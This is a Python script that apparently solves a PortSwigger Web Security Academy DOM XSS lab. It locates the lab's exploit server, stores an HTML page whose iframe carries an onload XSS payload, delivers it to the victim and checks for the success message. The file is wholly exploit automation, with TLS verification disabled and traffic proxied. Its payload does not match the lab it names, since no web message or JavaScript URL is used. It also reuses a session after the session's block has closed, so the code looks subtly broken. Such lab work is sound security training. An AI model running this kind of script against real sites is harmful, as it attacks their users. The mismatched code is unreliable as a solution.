# !/usr/bin/env python3

import sys
import time

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = 'https://0a5900da0410a033c0af4c18007f00a1.web-security-academy.net/'


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def store_exploit(client, exploit_server):
    data = {'urlIsHttps': 'on',
            'responseFile': f'/{url[8:]}',
            'responseHead': '''HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Referrer-Policy: unsafe-url''',
            'responseBody': '''
<html>
  <body>
<html>
<body>
<iframe src="''' + url + '''" width="100%" height="100%" onload=print(1) ></iframe>
  </body>
</html>


           ''', 'formAction': 'STORE'}
    return client.post(exploit_server, data=data).status_code == 200


def main():
    print('Lab#2 - DOM XSS using web messages and a JavaScript URL')

    with requests.session() as client:
        client.verify = False
        client.proxies = proxies

    exploit_server = find_exploitserver(client.get(url).text)
    if exploit_server is None:
        print('Failed to find exploit server')
        sys.exit(-2)
    print('Exploit server found')

    if not store_exploit(client, exploit_server):
        print('Failed to store exploit')
        sys.exit(-3)
    print('Exploit server stored..')

    if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
        print('Failed to delivery exploit')
        sys.exit(-4)
    print('Delivered exploit')

    time.sleep(2)
    if 'Congratulations, you solved the lab!' not in client.get(f'{url}').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)
    print('Lab solved')


if __name__ == "__main__":
    main()
